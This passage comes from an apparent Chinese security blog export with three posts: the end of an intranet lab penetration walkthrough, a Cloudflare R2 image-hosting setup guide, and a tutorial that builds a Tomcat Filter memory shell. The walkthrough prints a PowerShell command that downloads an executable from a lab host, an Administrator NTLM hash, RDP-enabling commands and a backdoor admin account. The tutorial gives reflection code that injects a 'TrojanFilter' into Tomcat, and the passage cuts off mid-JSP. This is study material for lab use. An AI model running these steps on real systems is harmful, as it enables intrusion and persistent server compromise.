<p>Server2019下载后门<code>powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://10.0.10.111/Z.exe&#39;,&#39;C:\Z.exe&#39;)</code></p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902223727949.png" alt="image-20240902223727949"></p>
<p>Server2016 Beacon主动连接一下<code>shell connect 10.0.10.110 4444</code></p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902223803004.png" alt="image-20240902223803004"></p>
<h2 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h2><p>设置一下SOCKS 代理</p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902212438602.png" alt="image-20240902212438602"></p>
<p>开启远程登录，防火墙允许TCP通信3389</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">wmic RDTOGGLE WHERE <span class="hljs-attribute">ServerName</span>=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> call SetAllowTSConnections 1<br><br>netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Remote Desktop&quot;</span> <span class="hljs-attribute">protocol</span>=TCP <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">localport</span>=3389 <span class="hljs-attribute">action</span>=allow<br><br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902225853099.png" alt="image-20240902225853099"></p>
<p>密钥的话可以用刚刚获得<code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15:::</code>破解一下</p>
<p>或者添加一个管理员用户</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><code class="hljs crmsh"><span class="hljs-comment"># 添加用户</span><br>net <span class="hljs-keyword">user</span> <span class="hljs-title">hack</span> user123.com /add<br><span class="hljs-comment"># 添加到管理员组</span><br>net localgroup administrators hack /add<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902225250187.png" alt="image-20240902225250187"></p>
<p><img src="https://image.sp4rks.xyz/2024/09/image-20240902225526376.png" alt="image-20240902225526376"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这套靶机主要考验，正、反向连接之间与防火墙的关系；socks代理；比较知名的漏洞永恒之蓝、CVE-2020-1472的利用方式；以及一些内网常用的命令。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://forum.butian.net/share/1832">看我用内网MSF打公网永恒之蓝</a></p>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>内网靶场渗透实战</tag>
      </tags>
  </entry>
  <entry>
    <title>利用Cloudflare R2搭建图床</title>
    <url>/2024/07/08/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/%E5%88%A9%E7%94%A8Cloudflare%20R2%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前博客都是通过GitHub实现图床的，但是国内访问图片的速度实在是不敢恭维；另外GitHub其实是不允许做图床的，当库超过1G以后会有人工审查，发现是图床可能会删库，甚至封帐号；</p>
<h2 id="前期解决方案"><a href="#前期解决方案" class="headerlink" title="前期解决方案"></a>前期解决方案</h2><p>总体来看有几个解决方法</p>
<p>阿里云oss	腾讯云cos	七牛云	又拍云</p>
<p>七牛云有免费的额度，也可以使用不备案的域名，但是这样的话图片速度比Github还慢</p>
<p>又拍云需要网站备案，加入又拍云联盟才有免费额度，又拍云联盟需要在你的网站上加上他们的广告和需要手持证件照拍照审核</p>
<p>综上，前期我用的第一个解决方案是腾讯云的cos桶，类似的还有阿里云的oss，价格其实也不贵</p>
<p>但是当我部署完了，去浏览器打开图片连接发现，浏览器会自动下载图片，不能预览，翻了半天cos介绍才知道，域名没备案的不支持预览，浏览器打开连接就直接下载了。用了一段时间，虽然没啥大问题，但是总感觉不爽。</p>
<p>总体来说上面的方案都需要备案才能有良好的使用体验。</p>
<p>于是最后转向了<strong>Cloudflare</strong>的怀抱</p>
<p>优势是：</p>
<p>网站不需要备案，有免费额度</p>
<p>图片响应速度快</p>
<p><strong>R2 定价</strong></p>
<table>
<thead>
<tr>
<th>ㅤ</th>
<th>免费</th>
<th>超出部分&#x2F;月费</th>
</tr>
</thead>
<tbody><tr>
<td>存储</td>
<td>10 GB&#x2F;月</td>
<td>0.015 美元&#x2F;GB</td>
</tr>
<tr>
<td>A 类操作</td>
<td>100 万次&#x2F;月</td>
<td>4.50 美元&#x2F;百万次</td>
</tr>
<tr>
<td>B 类操作</td>
<td>1000 万次&#x2F;月</td>
<td>0.36 美元&#x2F;百万次</td>
</tr>
</tbody></table>
<h2 id="使用Cloudflare-R2的前期准备"><a href="#使用Cloudflare-R2的前期准备" class="headerlink" title="使用Cloudflare R2的前期准备"></a>使用Cloudflare R2的前期准备</h2><p><a href="https://github.com/Kuingsmile/PicList">PicList</a></p>
<p><a href="https://www.paypal.com/">paypal</a></p>
<p>域名(可不备案)</p>
<h2 id="第一个坑点"><a href="#第一个坑点" class="headerlink" title="第一个坑点"></a>第一个坑点</h2><p>其实之前很早就注册<strong>Cloudflare</strong>了，上去看了一下，有很多自己不是很了解的东西，就留在温柔乡了。。。继续使用cos桶；另一个问题是之前听过创建R2存储用paypal就行，但是我上去看必须要信用卡，遂放弃。</p>
<p>偶然发现是梯子的问题</p>
<p>个人习惯梯子开机自启，习惯谷歌，杜绝百度</p>
<p>可以看到并没有出现paypal的选项</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628144516183.png" alt="image-20240628144516183"></p>
<p>不开梯子就可以使用paypal付款了</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628144701802.png" alt="image-20240628144701802"></p>
<h2 id="网站托管到Cloudflare"><a href="#网站托管到Cloudflare" class="headerlink" title="网站托管到Cloudflare"></a>网站托管到Cloudflare</h2><p>首先需要把你的域名添加到<strong>Cloudflare</strong></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628145013147.png" alt="image-20240628145013147"></p>
<p>选择免费的计划就行，随后会分配两个dns服务器</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628145259856.png" alt="image-20240628145259856"></p>
<p>直接去域名的服务商那里改成这<strong>Cloudflare</strong>的DNS地址</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628145524103.png" alt="image-20240628145524103"></p>
<p>另外使用CF之后发现，网站加载速度很慢。把A记录和CNAME设置为仅DNS就行</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151002609.png" alt="image-20240628151002609"></p>
<h2 id="创建存储桶"><a href="#创建存储桶" class="headerlink" title="创建存储桶"></a>创建存储桶</h2><p>位置选择 亚太地区</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151346032.png" alt="image-20240628151346032"></p>
<p>R2创建完之后，设置连接域名，输入刚刚添加的域名的三级域名，比如 a.com 写为image.a.com，<strong>Cloudflare</strong>会自动添加记录，用这个域名就可以访问R2存储的内容</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151514382.png" alt="image-20240628151514382"></p>
<p>接着添加一个管理令牌</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151750145.png" alt="image-20240628151750145"></p>
<p>剩下的默认即可</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628151925647.png" alt="image-20240628151925647"></p>
<h2 id="PicList不能同步删除云端图片的解决方案"><a href="#PicList不能同步删除云端图片的解决方案" class="headerlink" title="PicList不能同步删除云端图片的解决方案"></a>PicList不能同步删除云端图片的解决方案</h2><p>严格按照如图所示位置填写</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628152607640.png" alt="image-20240628152607640"></p>
<p>上传路径可以根据表自己组合填写</p>
<table>
<thead>
<tr>
<th align="center">payload</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>&#123;year&#125;</code></td>
<td align="center">当前日期 - 年</td>
</tr>
<tr>
<td align="center"><code>&#123;month&#125;</code></td>
<td align="center">当前日期 - 月</td>
</tr>
<tr>
<td align="center"><code>&#123;day&#125;</code></td>
<td align="center">当前日期 - 日</td>
</tr>
<tr>
<td align="center"><code>&#123;fullName&#125;</code></td>
<td align="center">完整文件名（含扩展名）</td>
</tr>
<tr>
<td align="center"><code>&#123;fileName&#125;</code></td>
<td align="center">文件名（不含扩展名）</td>
</tr>
<tr>
<td align="center"><code>&#123;extName&#125;</code></td>
<td align="center">扩展名（不含.）</td>
</tr>
<tr>
<td align="center"><code>&#123;md5&#125;</code></td>
<td align="center">图片 MD5 计算值</td>
</tr>
<tr>
<td align="center"><code>&#123;sha1&#125;</code></td>
<td align="center">图片 SHA1 计算值</td>
</tr>
<tr>
<td align="center"><code>&#123;sha256&#125;</code></td>
<td align="center">图片 SHA256 计算值</td>
</tr>
<tr>
<td align="center"><code>&#123;timestamp&#125;</code></td>
<td align="center">Unix 时间戳</td>
</tr>
<tr>
<td align="center"><code>&#123;timestampMS&#125;</code></td>
<td align="center">Unix 时间戳（毫秒）</td>
</tr>
</tbody></table>
<p>地区因为选择亚太地区所有填写 apac</p>
<p><strong>自定义域名写刚刚的三级域名如:<a href="http://image.a.com/">http://image.a.com</a></strong></p>
<hr>
<h3 id="PicList不能同步删除云端图片的踩坑记录"><a href="#PicList不能同步删除云端图片的踩坑记录" class="headerlink" title="PicList不能同步删除云端图片的踩坑记录"></a>PicList不能同步删除云端图片的踩坑记录</h3><p>之前设置<strong>PicList</strong>自定义节点使用了这个 S3 API，它其实和上图管辖地址只差一个存储桶的名字 </p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240628153202851.png" alt="image-20240628153202851"></p>
<p>而且可以上传图片，但是图片在typora加载会失败</p>
<p>随后将<strong>PicList</strong>自定义域名<a href="http://image.a.com,改为http//image.a.com/blog1">http://image.a.com，改为http://image.a.com/blog1</a></p>
<p>图片显示正常</p>
<p>用了一段时间才发现<strong>PicList</strong>不能同步删除云端图片，看日志没有看到删除记录</p>
<p>最开始谷歌半天找不到原因，随后找到这个issuse:<a href="https://github.com/Kuingsmile/PicList/issues/203%E6%89%8D%E8%A7%A3%E5%86%B3%E8%BF%99%E4%B8%AA%E9%97%AE%E9%A2%98">https://github.com/Kuingsmile/PicList/issues/203才解决这个问题</a></p>
<p>随后<strong>PicList</strong>也可以正常的删除云端的图片了</p>
<p><strong>(浪费贼多时间去谷歌，看来下次遇到问题得先去看issuse)</strong></p>
<h2 id="🤗Enjoy！"><a href="#🤗Enjoy！" class="headerlink" title="🤗Enjoy！"></a>🤗Enjoy！</h2><h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p><a href="https://developers.cloudflare.com/r2/">Cloudflare R2 · Cloudflare R2 docs</a></p>
<p><a href="https://github.com/Kuingsmile/PicList/issues/203">Bug无法同步删除云端 #203</a></p>
<p><a href="https://piclist.cn/app">PicList文档</a></p>
]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>奇技淫巧</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat Servlet-api内存马#Filter型</title>
    <url>/2024/08/06/JAVA%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>网上文章都是filter已经创建好了，然后关注创建过程中需要的关键参数。</p>
<p>组长的视频思路更偏向于filter的创建过程。这篇文章基于组长的思路编写。</p>
<h1 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h1><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Tomcat8-Servlet<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Tomcat8-Servlet<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>war<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">junit.version</span>&gt;</span>5.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">junit.version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.junit.jupiter<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit-jupiter-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>$&#123;junit.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.junit.jupiter<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit-jupiter-engine<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>$&#123;junit.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.100<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>        //这里替换为自己的版本<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-war-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.3.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>(tomcat的核心就是catalina，不导入它很多文件找不到)</p>
<h1 id="Tomcat注册Filter流程"><a href="#Tomcat注册Filter流程" class="headerlink" title="Tomcat注册Filter流程"></a>Tomcat注册Filter流程</h1><p>在<code>configureContext</code>方法中，关于Filter的操作其实就这些</p>
<p><img src="https://image.sp4rks.xyz/2024/08/image-20240806130044069.png" alt="image-20240806130044069"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (FilterDef filter : webxml.getFilters().values()) &#123;      <span class="hljs-comment">//把xml文件读出来，类型为FilterDef </span><br>    <span class="hljs-keyword">if</span> (filter.getAsyncSupported() == <span class="hljs-literal">null</span>) &#123;				<span class="hljs-comment">//异步支持，不重要</span><br>        filter.setAsyncSupported(<span class="hljs-string">&quot;false&quot;</span>);<br>    &#125;<br>    context.addFilterDef(filter); 							<span class="hljs-comment">//添加到context里面</span><br>&#125;<br><br><span class="hljs-keyword">for</span> (FilterMap filterMap : webxml.getFilterMappings()) &#123;    <span class="hljs-comment">//把xml映射读出来，类型为FilterMap</span><br>    context.addFilterMap(filterMap);						<span class="hljs-comment">//添加到context里面</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>其实就是对应xml文件的配置</p>
<p><img src="https://image.sp4rks.xyz/2024/08/image-20240806130524241.png" alt="image-20240806130524241"></p>
<p>那我们注意实现<code>context.addFilterDef(filter);</code>和<code>context.addFilterMap(filterMap);</code>就可以了</p>
<hr>
<p>也就是说到目前为止想把恶意的Filter注册到tomcat需要实现的是</p>
<p>1.获取一个<code>ServletContext</code>对象</p>
<p>2.实现<code>context.addFilterDef(filter) </code>#将Filter实例化对象添加到StandardContext里面</p>
<p>3.实现<code>context.addFilterMap(filterMap) </code> #将Filter映射关系添加到StandardContext里面</p>
<h1 id="注册恶意Filter到tomcat"><a href="#注册恶意Filter到tomcat" class="headerlink" title="注册恶意Filter到tomcat"></a>注册恶意Filter到tomcat</h1><p><code>FilterDef</code>有对应的getter和setter方法 ，那这样子的话就可以直接用set方法来注册我们的恶意Filter</p>
<p><img src="https://image.sp4rks.xyz/2024/08/image-20240806130937461.png" alt="image-20240806130937461"></p>
<p><code>FilterMap</code>有对应的getter和setter方法 ，可以直接用set方法来注册我们的恶意Filter映射</p>
<p><img src="https://image.sp4rks.xyz/2024/08/image-20240806131119841.png" alt="image-20240806131119841"></p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//动态注册Filter</span><br><span class="hljs-comment">//1.获取context</span><br><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br><span class="hljs-type">Field</span> <span class="hljs-variable">applicationContextField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br><br><br>  <span class="hljs-comment">//2.实现context.addFilterDef(filterDef);</span><br>  <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>  filterDef.setFilter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TrojanFilter</span>());<br>  filterDef.setFilterName(<span class="hljs-string">&quot;TrojanFilter&quot;</span>);<br>  filterDef.setFilterClass(TrojanFilter.class.getName());<br>  context.addFilterDef(filterDef);<br><br>  <span class="hljs-comment">//3.实现context.addFilterMap(filterMap);</span><br>  <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>  filterMap.setFilterName(<span class="hljs-string">&quot;TrojanFilter&quot;</span>);<br>  filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>  context.addFilterMap(filterMap);<br></code></pre></td></tr></table></figure>



<h2 id="Filter内存马不能成功运行"><a href="#Filter内存马不能成功运行" class="headerlink" title="Filter内存马不能成功运行"></a>Filter内存马不能成功运行</h2><p>但是会发现啊，这样子并不能成功运行，排查了好久。直到看到Y4师傅的文章提到了这个方法</p>
<p><code>org.apache.catalina.core.StandardContext#filterStart</code></p>
<p><img src="https://image.sp4rks.xyz/2024/08/image-20240806131609599.png" alt="image-20240806131609599"></p>
<p>让我们在init打上断点，找到<code>filterStart</code>这个类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterConfig</span>(<span class="hljs-built_in">this</span>, entry.getValue())<br></code></pre></td></tr></table></figure>

<p>可以看到<code>this</code>就是<code>StandardContext</code>，<code>entry.getValue()</code>就是<code>FilterDef</code></p>
<p>也就是说这段代码把<code>StandardContex</code>t和<code>FilterDef</code>封装成了<code>ApplicationFilterConfig</code>类型,名字叫filterConfig</p>
<p><img src="https://image.sp4rks.xyz/2024/08/image-20240806132047040.png" alt="image-20240806132047040"></p>
<p>然后看到下一行</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript">filterConfigs.<span class="hljs-keyword">put</span>(<span class="hljs-built_in">name</span>, filterConfig);<br></code></pre></td></tr></table></figure>

<p>关注到<code>filterConfigs</code>，点进<code>filterConfigs</code>，其实是一个HashMap，把<code>filter名字</code>和刚刚创建的<code>filterConfig</code>，put进<code>filterConfigs</code>里面。而且更应该关注的是<code>filterConfigs</code>其实<code>StandardContext</code>的一个属性，直接用反射可以修改。</p>
<p><img src="https://image.sp4rks.xyz/2024/08/image-20240806132533105.png" alt="image-20240806132533105"></p>
<p>所以现在需要实现的目标是</p>
<ol>
<li><code>ApplicationFilterConfig filterConfig = new ApplicationFilterConfig(this, entry.getValue());</code> #将StandardContext和FilterDef封装成ApplicationFilterConfig类型</li>
<li><code>filterConfigs.put(name, filterConfig); </code>#将我们封装好的filterConfig put到filterConfigs里面</li>
</ol>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><code class="hljs kotlin"><span class="hljs-comment">//封装filterDef为ApplicationFilterConfig类的对象</span><br>Constructor <span class="hljs-keyword">constructor</span> = ApplicationFilterConfig.<span class="hljs-keyword">class</span>.getDeclaredConstructor(Context.<span class="hljs-keyword">class</span>,FilterDef.<span class="hljs-keyword">class</span>);<br><span class="hljs-keyword">constructor</span>.setAccessible(<span class="hljs-literal">true</span>);<br>ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) <span class="hljs-keyword">constructor</span>.newInstance(context,filterDef);<br><br><span class="hljs-comment">//在context对象的filterConfigs属性中添加上我们构造好的ApplicationFilterConfig类的对象</span><br>Field Configs = context.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>Configs.setAccessible(<span class="hljs-literal">true</span>);<br>Map filterConfigs = (Map) Configs.<span class="hljs-keyword">get</span>(context);<br>filterConfigs.put(<span class="hljs-string">&quot;TrojanFilter&quot;</span>,filterConfig);<br></code></pre></td></tr></table></figure>



<h1 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h1><p>那总结一下实现filter内存马，总过有五步</p>
<p>1.获取一个<code>ServletContext</code>对象</p>
<p>2.实现<code>context.addFilterDef(filter) </code>#将Filter实例化对象添加到StandardContext里面</p>
<p>3.实现<code>context.addFilterMap(filterMap) </code> #将Filter映射关系添加到StandardContext里面<br>4.实现<code>ApplicationFilterConfig filterConfig = new ApplicationFilterConfig(this, entry.getValue());</code> #将StandardContext和FilterDef封装成ApplicationFilterConfig类型</p>
<p>5.实现<code>filterConfigs.put(name, filterConfig);</code> #将我们封装好的filterConfig put到filterConfigs里面</p>
<p>随后便是tomcat filter流程</p>
<ol>
<li>首先是 invoke() 方法</li>
</ol>
<p>层层调用管道，在最后一个管道的地方会创建一个链子，这个链子是 FilterChain，再对里头的 filter 进行一些相关的匹配。</p>
<ol start="2">
<li>filterchain 拿出来之后</li>
</ol>
<p>进行 <code>doFilter()</code> 工作，将请求交给对应的 pipeline 去处理，也就是进行一个 <code>doFilter()</code> —-&gt; <code>internalDoFilter()</code> —-&gt; <code>doFilter()</code>；直到最后一个 filter 被调用。</p>
<ol start="3">
<li>最后一个 filter</li>
</ol>
<p>最后一个 filter 会执行完 <code>doFilter()</code> 操作，随后会跳转到 <code>Servlet.service()</code> 这里。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;<br>&lt;%@ page 